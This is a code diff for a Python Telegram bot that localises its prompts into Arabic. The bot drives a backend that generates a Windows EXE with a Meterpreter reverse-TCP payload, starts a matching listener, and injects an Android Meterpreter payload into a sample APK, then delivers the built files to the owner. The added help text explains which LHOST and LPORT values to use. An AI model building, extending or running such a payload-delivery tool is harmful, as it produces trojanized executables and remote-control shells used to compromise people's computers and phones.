@@ -44,19 +44,25 @@ class Session:
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
         if update.message:
-            await update.message.reply_text("Access denied.")
+            await update.message.reply_text("تم رفض الوصول.")
         elif update.callback_query:
-            await update.callback_query.answer("Access denied.", show_alert=True)
+            await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
         return ConversationHandler.END
     kb = [
-        [InlineKeyboardButton("Windows Payload", callback_data="kind:payload")],
-        [InlineKeyboardButton("Listener", callback_data="kind:listener")],
+        [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
+        [InlineKeyboardButton("مستمع (Listener)", callback_data="kind:listener")],
         [InlineKeyboardButton("Android APK", callback_data="kind:android")],
     ]
+    intro = (
+        "اختر نوع المهمة:\n"
+        "- بايلود ويندوز: توليد ملف EXE يحتوي اتصال عكسي (Meterpreter).\n"
+        "- مستمع: تشغيل مستمع لالتقاط الاتصال على LHOST/LPORT.\n"
+        "- Android APK: حقن حمولة داخل ملف APK عيّنة وإرساله لك."
+    )
     if update.message:
-        await update.message.reply_text("Select task type:", reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text(intro, reply_markup=InlineKeyboardMarkup(kb))
     else:
-        await update.callback_query.edit_message_text("Select task type:", reply_markup=InlineKeyboardMarkup(kb))
+        await update.callback_query.edit_message_text(intro, reply_markup=InlineKeyboardMarkup(kb))
     context.user_data["session"] = Session(kind=None, params={})
     return MENU
 
@@ -73,15 +79,32 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sess: Session = context.user_data.get("session")
     sess.kind = kind
     sess.params = {}
-    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back")]])
+    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="back")]])
     if kind == "payload":
-        await query.edit_message_text("Send parameters as: lhost lport output_name (payload fixed)", reply_markup=back_kb)
+        txt = (
+            "أرسل المعلمات بهذا الشكل: LHOST LPORT OUTPUT_NAME\n"
+            "مثال: 192.168.1.10 4444 win_test\n"
+            "ملاحظة: سيتم استخدام payload افتراضي windows/meterpreter/reverse_tcp"
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
     elif kind == "listener":
-        await query.edit_message_text("Send parameters as: lhost lport", reply_markup=back_kb)
+        txt = (
+            "أرسل المعلمات بهذا الشكل: LHOST LPORT\n"
+            "مثال شائع: 0.0.0.0 4444 (يستمع على كل الواجهات)\n"
+            "يجب أن تطابق القيم المستخدمة في البايلود."
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
     elif kind == "android":
-        await query.edit_message_text("Send parameters as: lhost lport (APK sample will be used)", reply_markup=back_kb)
+        txt = (
+            "أرسل المعلمات بهذا الشكل: LHOST LPORT\n"
+            "مثال محاكي Android Studio: 10.0.2.2 4444\n"
+            "مثال Genymotion: 10.0.3.2 4444\n"
+            "أو داخل شبكة محلية: 192.168.x.x 4444\n"
+            "سيُستخدم APK عيّنة وسيتم إرسال الناتج لك."
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
     else:
-        await query.edit_message_text("Unsupported kind")
+        await query.edit_message_text("خيار غير مدعوم")
         return ConversationHandler.END
     return PARAMS
 
@@ -89,32 +112,32 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     sess: Session = context.user_data.get("session")
     if not sess or not sess.kind:
-        await update.message.reply_text("No session. Use /start")
+        await update.message.reply_text("لا توجد جلسة نشطة. استخدم /start")
         return ConversationHandler.END
     parts = update.message.text.strip().split()
     if sess.kind == "payload":
         if len(parts) < 3:
-            await update.message.reply_text("Usage: lhost lport output_name")
+            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME\nمثال: 192.168.1.10 4444 win_test")
             return PARAMS
         lhost, lport, output_name = parts[:3]
         payload = "windows/meterpreter/reverse_tcp"
         sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
     elif sess.kind == "listener":
         if len(parts) < 2:
-            await update.message.reply_text("Usage: lhost lport")
+            await update.message.reply_text("الاستخدام: LHOST LPORT\nمثال: 0.0.0.0 4444")
             return PARAMS
         lhost, lport = parts[:2]
         payload = "windows/meterpreter/reverse_tcp"
         sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
     elif sess.kind == "android":
         if len(parts) < 2:
-            await update.message.reply_text("Usage: lhost lport")
+            await update.message.reply_text("الاستخدام: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444")
             return PARAMS
         lhost, lport = parts[:2]
         payload = "android/meterpreter/reverse_tcp"
         sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
     else:
-        await update.message.reply_text("Unsupported kind")
+        await update.message.reply_text("خيار غير مدعوم")
         return ConversationHandler.END
 
     # create task
@@ -124,7 +147,7 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         data = resp.json()
         task = data["task"]
         sess.task_id = task["id"]
-    await update.message.reply_text(f"Task created: {sess.task_id}. Polling…")
+    await update.message.reply_text(f"تم إنشاء المهمة: {sess.task_id}\nسيتم تتبع التقدم وإرسال الملفات عند الانتهاء…")
     await poll_and_send(update, context, sess)
     return ConversationHandler.END
 
@@ -137,7 +160,8 @@ async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess
             r.raise_for_status()
             task = r.json()["task"]
             state = task["state"]
-            await context.bot.send_message(chat_id, f"State: {state}")
+            state_ar = {"SUBMITTED":"تم الإرسال","PREPARING":"جارِ التحضير","RUNNING":"جارِ التنفيذ","SUCCEEDED":"تم بنجاح","FAILED":"فشل","CANCELLED":"أُلغي"}.get(state, state)
+            await context.bot.send_message(chat_id, f"الحالة: {state_ar}")
             if state in ("SUCCEEDED", "FAILED", "CANCELLED"):
                 if state == "SUCCEEDED":
                     arts = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}/artifacts")
@@ -148,32 +172,31 @@ async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess
                             p = a["path"]
                             name = a["name"]
                             try:
-                                # send as document
                                 with open(p, "rb") as f:
-                                    await context.bot.send_document(chat_id, document=InputFile(f, filename=name))
+                                    await context.bot.send_document(chat_id, document=InputFile(f, filename=name), caption="الملف الناتج")
                             except Exception as e:
-                                await context.bot.send_message(chat_id, f"Failed to send {name}: {e}")
+                                await context.bot.send_message(chat_id, f"تعذّر إرسال {name}: {e}")
                 else:
-                    await context.bot.send_message(chat_id, f"Error: {task.get('error')}")
+                    await context.bot.send_message(chat_id, f"انتهت المهمة بحالة: {state_ar}\nالخطأ: {task.get('error')}")
                 return
             await asyncio.sleep(2)
-    await context.bot.send_message(chat_id, "Timeout waiting for task")
+    await context.bot.send_message(chat_id, "انتهت مهلة الانتظار دون إكمال المهمة")
 
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("Access denied.")
+        await update.message.reply_text("تم رفض الوصول.")
         return
     if not context.args:
-        await update.message.reply_text("Usage: /cancel <task_id>")
+        await update.message.reply_text("الاستخدام: /cancel <task_id>")
         return
     task_id = context.args[0]
     async with httpx.AsyncClient(timeout=30) as client:
         r = await client.post(f"{ORCH_URL}/tasks/{task_id}/cancel")
         if r.status_code == 200:
-            await update.message.reply_text(f"Cancelled: {task_id}")
+            await update.message.reply_text(f"تم إلغاء المهمة: {task_id}")
         else:
-            await update.message.reply_text(f"Failed to cancel: {r.text}")
+            await update.message.reply_text(f"تعذّر الإلغاء: {r.text}")
 
 
 def main():
